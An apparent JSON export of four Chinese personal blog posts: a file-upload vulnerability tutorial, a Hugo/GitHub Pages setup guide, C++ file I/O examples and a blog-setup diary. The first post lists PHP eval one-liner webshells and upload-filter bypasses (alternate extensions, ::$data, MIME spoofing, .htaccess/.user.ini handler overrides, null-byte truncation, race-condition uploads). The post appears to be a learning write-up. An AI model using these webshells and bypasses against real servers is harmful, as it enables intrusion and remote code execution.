[{"content":"常见的PHP一句话木马： 1 \u0026lt;?php @eval($_GET[\u0026#39;cmd\u0026#39;]);?\u0026gt; 1 \u0026lt;?php @eval($_POST[\u0026#39;cmd\u0026#39;]);?\u0026gt; 1 \u0026lt;?php @eval($_REQUEST[\u0026#39;cmd\u0026#39;]);?\u0026gt; 1 \u0026lt;?php @eval($_COOKIE[\u0026#39;cmd\u0026#39;]);?\u0026gt; 将这些PHP文件上传到服务器，并且通过对应的方式传参，就可以调用PHP函数，比如以GET的为例\n1 example.com/shell.php?cmd=phpinfo(); 就可以跳转到PHPinfo页面\n但我们在使用这个漏洞时必须满足3个条件：\n可以被上传（不被过滤或者绕过过滤） 可以被访问（知道路径） 可以被执行（能被解释器执行） webshell连接工具的使用 更进一步，如果我们满足了使用漏洞的条件，我们就可以使用工具来进一步利用\n常见的工具有：\n中国蚁剑(AntSword) 冰蝎(Behinder) 哥斯拉(Godzilla) 在连接上我们的一句话木马后，我们就可以获得多种权限\n注意：蚁剑只能连接POST的一句话木马，GET和COOKIE无法连接\n绕过验证 但是一般的网页在上传文件时都会有验证，一般是白名单和黑名单\n若是黑名单，可以尝试以下方法： 1. 使用其他后缀名 若网站只针对.php做了限制，则可以使用php3、phtml、php4等后缀名\n若都做出了限制，可以尝试\n改变后缀名大小写 在后缀名后面加上空格 对上传文件进行抓包，在文件名后面加上::$data，比如： 1 example.php::$data 以上三个方法只对Windows服务器有用，因为Windows不区分大小写，并且会忽略文件后缀名后面的空格，::$data是Windows特有的NTFS的文件流，也只适用于Windows\n2.修改MIME类型 有些检测只检测Content－Type，比如只检测文件上传时，是不是\n1 Content-Type: image/jpeg 遇到这样的，我们就可以尝试抓包并修改它，再次发送，看行不行\n3.尝试上传.htaccess和.user.ini 上传一个.htaccess文件，然后在里面写上\n1 SetHandler application/x-http-php 或者\n1 AddType application/x-httpd-php .xxx .jpg(.xxx) 将.xxx文件作为用PHP解析的文件\n这可以让当前目录所有文件都用PHP解析\n然后我们就可以上传任意一个含有一句话木马的文件（当然，后缀名不能在黑名单里面），进行目的操作。\n上传一个.user.ini，然后写上\n1 auto_prepend_file=\u0026#34;shell.jpg\u0026#34; 就可以让这个文件在每个PHP文件之前被加载\n然后我们可以上传一个shell.jpg的一句话木马，进行目的操作\n4.利用PHP函数特性，绕过黑名单 deldot(): 从后往前检测，检测到末尾的第一个.时会继续往前检测，但遇到空格会停下来 所以我们可以\n1 xxx.php -\u0026gt; xxx.php . str_ireplace(str1,str2,str3): 将str3的所有str1替换为str2，所以我们可以\n1 xxx.php -\u0026gt; xxx.pphphp -\u0026gt; xxx.php 若是白名单，我们可以： 1. 解析漏洞利用 1. Apache解析漏洞 1 shell.php.xxx （如果Apache配置错误，可能解析为PHP） 2. IIS/Nginx解析漏洞 1 2 shell.jpg%00.php （PHP 5.3.4之前的截断漏洞） shell.jpg\\x00.php 2. 文件包含漏洞组合利用 上传包含马的内容到图片中\n1 exif_imagetype(\u0026#39;shell.jpg\u0026#39;); 然后通过文件包含执行\n1 2 include($_GET[\u0026#39;file\u0026#39;]); example.com/?file=uploads/shell.jpg 3. .htaccess/.user.ini攻击 和黑名单的一样\n4. 竞争条件攻击 对于先保存后检测的场景：\n1 2 3 while True: upload(\u0026#39;shell.php\u0026#39;) access(\u0026#39;shell.php\u0026#39;) 一边不断上传，一边不断连接，只要比服务器检测快就能成功\n","date":"2025-04-20T22:51:55+08:00","permalink":"https://nacog.github.io/Blog/p/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Ephp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/","title":"文件上传漏洞－PHP一句话木马"},{"content":"注：本教程仅适用于有一定计算机基础知识，并且会百度、问AI的人\n1.环境搭建 Huog (需要配置环境变量，本教程会详细演示) git/github desktop(本教程将使用Github desktop) vscode 下载Hugo，并配置Hugo 选择Hugo_extended_0.146.5_windows-amd64.zip 解压下来，复制解压目录的位置 搜索环境变量 选择右下角的环境变量，进入后双击上面用户变量的Path，让后新建，粘贴刚才复制的文件位置 在cmd输入hugo version检验安装\n2.开始 打开Vscode,在终端中输入hugo new site blog(blog可以改成其它名字) 按照提示来做，先cd blog进入目录\n然后在hugo theme下载主题，并且解压到blog/themes 本教程将采用Stack主题 、下载并且解压完毕后，目录应该是这样的(我把Stack主题版本号删了)\n然后删除hugo.toml，复制\n1 \u0026#34;blog\\themes\\hugo-theme-stack\\exampleSite\\hugo.yaml\u0026#34; 到blog目录 然后在控制台输入hugo server启动，在浏览器访问localhost:1313打开博客 可以看到已经配置成功了，更进一步的网页配置可以参考\n中文文档\n官方文档\n在之后有时间我会继续写如何配置网页，这里先部署\n3.部署到Github Pages 在github新建仓库\n然后在本地新建文件夹，打开github desktop在\n1 File \u0026gt;\u0026gt; Clone repository 选择刚刚创建的仓库并且编辑本地路径，点击clone\n回到vscode,把hugo.yaml的baseurl更改为\n1 baseurl: https://YOURNAME.github.io/REPOSITORYNAME 最后在终端，输入hugo -D 将public文件夹内的所有文件复制到刚刚Clone的仓库\n然后在github desktop提交(每次提交都得有Summary)\n然后点击右边的Publish branch\n然后去github对应的仓库\n转到上面的\n1 设置 \u0026gt;\u0026gt; Github Pages \u0026gt;\u0026gt; 分支选择main 然后github会自动部署\n然后访问你刚刚的baseURL就可以进入网站了~\n","date":"2025-04-16T17:54:43+08:00","permalink":"https://nacog.github.io/Blog/p/%E4%BF%9D%E5%A7%86%E7%BA%A7%E6%95%99%E7%A8%8B%E6%95%99%E4%BD%A0%E7%94%A8hugo-github-pages%E6%90%AD%E5%BB%BA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84%E5%85%8D%E8%B4%B9%E5%8D%9A%E5%AE%A2%E4%B8%80/","title":"保姆级教程，教你用Hugo+github pages搭建属于自己的免费博客(一)"},{"content":"CPP 文件操作 1.顺序文件 以结构体数据操作为例，顺便练习一下Lambda表达式\n1 2 3 4 5 6 7 8 9 10 typedef struct Student{ string name; int age; double height; Student(string n,int a,double h):name(n),age(a),height(h){} friend ofstream \u0026amp;operator\u0026lt;\u0026lt;(ofstream \u0026amp;out,const Student \u0026amp;stu){ out\u0026lt;\u0026lt;stu.name\u0026lt;\u0026lt;\u0026#34;\\t\u0026#34;\u0026lt;\u0026lt;stu.age\u0026lt;\u0026lt;\u0026#34;\\t\u0026#34;\u0026lt;\u0026lt;stu.height\u0026lt;\u0026lt;\u0026#34;\\n\u0026#34;; return out; } }St; 文件流写入数据 1 2 3 4 5 6 7 8 9 10 string filepath=\u0026#34;/home/sora/DOCS/my1/test001.txt\u0026#34;; function\u0026lt;void()\u0026gt; writedata=[\u0026amp;filepath](){ St s1(\u0026#34;张三三\u0026#34;,19,1.77); St s2(\u0026#34;李四\u0026#34;,20,1.75); ofstream out1; out1.open(filepath);//打开文件到内存缓冲区（out1-\u0026gt;该文件内存缓冲） out1\u0026lt;\u0026lt;s1\u0026lt;\u0026lt;s2; out1.close(); }; writedata(); 文件流读取数据 以空格分开读 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 string filepath=\u0026#34;/home/sora/DOCS/my1/test001.txt\u0026#34;; function\u0026lt;void()\u0026gt; readdata=[\u0026amp;filepath](){ ifstream cin1; cin1.open(filepath); function\u0026lt;void()\u0026gt; cin1out=[\u0026amp;cin1](int columns=3){ string str; int cnt=0; while(cin1\u0026gt;\u0026gt;str){ if(cnt==columns){cout\u0026lt;\u0026lt;\u0026#39;\\n\u0026#39;;cnt=0;} cout\u0026lt;\u0026lt;str\u0026lt;\u0026lt;\u0026#39;\\t\u0026#39;; cnt++; } }; cin1out(); cin1.close(); }; readdata(); 以行分开读 1 2 3 4 5 6 7 8 9 10 11 12 string filepath=\u0026#34;/home/sora/DOCS/my1/test001.txt\u0026#34;; function\u0026lt;void()\u0026gt; readdataln=[\u0026amp;filepath](){ ifstream cin1; cin1.open(filepath); string str; while(!cin1.eof()){ getline(cin1,str); cout\u0026lt;\u0026lt;str\u0026lt;\u0026lt;\u0026#39;\\n\u0026#39;; } cin1.close(); }; readdataln(); 2.随机文件 当 St 结构体包含字符串（如string name）时，直接二进制读写会导致问题。因为字符串通常是动态分配的，直接写入指针值而不是实际字符串内容。故我们需要修改结构体：\n1 2 3 4 5 6 7 8 9 10 struct St { char name[50];//使用固定大小数组代替string int age; double height; St(const char* n,int a,double h):age(a),height(h){ strncpy(name,n,sizeof(name)-1); name[sizeof(name)-1] = \u0026#39;\\0\u0026#39;; } St()=default; }; 写入数据 1 2 3 4 5 6 7 8 9 10 11 string filepath=\u0026#34;/home/sora/DOCS/my1/test010\u0026#34;; function\u0026lt;void()\u0026gt; writedatabin=[\u0026amp;filepath](){ St s1(\u0026#34;张三三\u0026#34;,19,1.77); St s2(\u0026#34;李四\u0026#34;,20,1.75); St s3(\u0026#34;Aminous\u0026#34;,114,514); ofstream out1(filepath,ios::binary); out1.write((char*)\u0026amp;s1,sizeof(St)); out1.write((char*)\u0026amp;s2,sizeof(St)); out1.write((char*)\u0026amp;s3,sizeof(St)); out1.close(); }; 读取数据 1 2 3 4 5 6 7 8 9 10 11 12 string filepath=\u0026#34;/home/sora/DOCS/my1/test010\u0026#34;; function\u0026lt;void()\u0026gt; readdatabin=[\u0026amp;filepath](){ ifstream cin1(filepath,ios::binary); vector\u0026lt;St\u0026gt; v; St T; while(cin1.read((char*)\u0026amp;T,sizeof(St))) v.push_back(T); for(const auto \u0026amp;s:v) cout \u0026lt;\u0026lt; s.name \u0026lt;\u0026lt; \u0026#39;\\t\u0026#39; \u0026lt;\u0026lt; s.age \u0026lt;\u0026lt; \u0026#39;\\t\u0026#39; \u0026lt;\u0026lt; s.height \u0026lt;\u0026lt; endl; cin1.close(); }; readdatabin(); ","date":"2025-04-15T13:28:45+08:00","permalink":"https://nacog.github.io/Blog/p/cpp-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/","title":"CPP 文件操作"},{"content":"经过 为了记录并且分享自己的学习经验，我决定搭建一个个人博客\n一开始，我发现阿里云有99一年的云服务器，想着买一个配合WordPress搭建个人博客，结果搞了半天发现这玩意得备案，香港服务器又是1000元一年，一搜索如何备案又麻烦的要死，又害怕一些小的可以提供香港服务器的云跑路，就想看看还有没有别的选项，网上搜索了半天资料，准备用Azure，结果学生认证不了，又一搜发现Azure在国内好像没有学生认证免费用的活动了……\n最终，在我仔细思考 (问AI) 后决定采用免费的github pages + hugo，然后就有了一堆问题 (主要是我太菜了)\n一开始我装了hugo的普通版本，用起来也没问题，结果在生成/public，把它放到仓库之后，它的css文件不能正常加载，问ai说是我要用hugo的extend版本\n换好版本，再来一遍，还是不行，上网搜索，发现大佬，解决问题\n1 git config --global core.autocrlf false 用这个指令，把回车符配置一下就行了 我还是没懂为什么\n然后我满怀激动地打开我的网页，博客格式正常了！结果点进博客，它直接给我跳转到了localhost:1313，问ai，说是我hugo.toml的baseURL没配置，我一看还真是:\n1 baseURL＝\u0026#34;https://example.com/\u0026#34; 配置好了再次上传仓库，等待部署，结果，打开一看，还是不行。\n然后我一气之下把整个东西删了重搞，结果就成功了？？？\n我认为这个问题主要是出在PaperMod这个主题上，因为在我换了主题后，部署一次就成功了😅\n而PaperMod非常麻烦，首先，要先把themes\\PaperMod\\layouts\\partials\\templates下的三个文件的\n1 {{- $images := partial \u0026#34;partials/templates/_funcs/get-page-images\u0026#34; . -}} 改成\n1 {{- $images := partial \u0026#34;/templates/_funcs/get-page-images\u0026#34; . -}} 就是把 partials/ 删掉(前面名字$images之类的不一定一样，但后面都差不多)\n其次，要在hugo.toml中加上\n1 2 3 [params.social] github = \u0026#34;https://github.com/xxx\u0026#34; email = \u0026#34;mailto:xxxx@xxxx\u0026#34; 很抽象\n最终我选择了hugo-theme-stack主题,就是这个网站的主题，相当的好用😋\n","date":"2025-04-15T13:28:45+08:00","image":"https://nacog.github.io/Blog/p/myfirstblog/1_hu_a50998802f79dee2.png","permalink":"https://nacog.github.io/Blog/p/myfirstblog/","title":"MyFirstBlog"}]